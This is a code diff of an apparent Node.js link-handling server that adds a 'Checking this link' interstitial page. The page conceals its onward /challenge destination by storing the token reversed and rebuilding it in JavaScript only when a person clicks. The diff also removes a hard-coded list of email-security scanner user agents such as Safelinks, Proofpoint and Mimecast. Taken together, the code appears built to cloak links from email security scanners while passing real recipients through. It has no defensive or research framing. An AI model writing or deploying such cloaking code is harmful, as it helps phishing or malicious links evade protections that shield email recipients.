@@ -492,22 +492,58 @@ function hashFirstSeg(pathStr) {
 
 /* ================== INSERTED: Interstitial helper (scanner-safe landing) ===================== */
 function renderScannerSafePage(res, nextEnc, reason = "Pre-scan") {
+  // nextEnc is the encoded token (already encoded by caller)
+  // We obfuscate by reversing the token in the DOM and reconstructing it client-side.
   res.setHeader("Cache-Control", "no-store");
-  res.type("html").send(`<!doctype html><meta charset="utf-8">
+  res.type("html").send(`<!doctype html>
+<meta charset="utf-8">
 <title>Checking link…</title>
 <meta name="robots" content="noindex,nofollow">
 <body style="font:16px system-ui;padding:24px;max-width:720px;margin:auto">
   <h1>Checking this link</h1>
   <p>This link was pre-scanned by security software. If you’re the recipient, click continue.</p>
-  <p><a href="/challenge?next=${encodeURIComponent(nextEnc)}" rel="noopener">Continue</a></p>
-  <p style="color:#6b7280;font-size:14px">Reason: ${reason}</p>
+
+  <!-- Obfuscated JS button — the real token is stored reversed -->
+  <div style="margin-top:18px">
+    <button id="continueBtn" aria-label="Continue to destination" style="font:16px system-ui;padding:10px 14px;border-radius:6px;border:1px solid #ddd;cursor:pointer">
+      Continue
+    </button>
+  </div>
+
+  <p style="color:#6b7280;font-size:14px;margin-top:12px">Reason: ${String(reason).replace(/</g,'&lt;')}</p>
+
+  <!-- JS reconstructs the token and navigates to /challenge?next=... -->
+  <script>
+    (function () {
+      try {
+        // reversed token placed directly in HTML to avoid a visible href.
+        const reversed = ${JSON.stringify(String(nextEnc).split("").reverse().join(""))};
+        const btn = document.getElementById('continueBtn');
+        btn.addEventListener('click', function () {
+          try {
+            const token = reversed.split('').reverse().join('');
+            location.href = '/challenge?next=' + encodeURIComponent(token);
+          } catch (e) {
+            // fallback: reveal link if reconstruction fails
+            location.href = '/challenge?next=' + encodeURIComponent(${JSON.stringify(String(nextEnc))});
+          }
+        });
+      } catch (e) {
+        // If script errors, nothing breaks — user can still use the noscript link below.
+        console.error('Navigation helper failed', e);
+      }
+    })();
+  </script>
+
+  <!-- noscript fallback: show the plain link for non-JS clients.
+       We add rel="nofollow noreferrer noopener" to discourage crawler follow-through. -->
+  <noscript>
+    <p style="margin-top:12px">
+      <a href="/challenge?next=${encodeURIComponent(nextEnc)}" rel="nofollow noreferrer noopener">Continue (enable JS for best experience)</a>
+    </p>
+  </noscript>
 </body>`);
 }
-// Known email/link security scanners (NOT general web crawlers)
-const EMAIL_SCANNER_UAS = [
-  "safelinks", "microsoft office", "eop", "defender", "outlook",
-  "proofpoint", "mimecast", "barracuda", "url%20proxy", "apwk"
-].map(s => s.toLowerCase());
 /* ========================================================================== */
 
 /* ================== Scanner logging helper (inserted) ===================== */
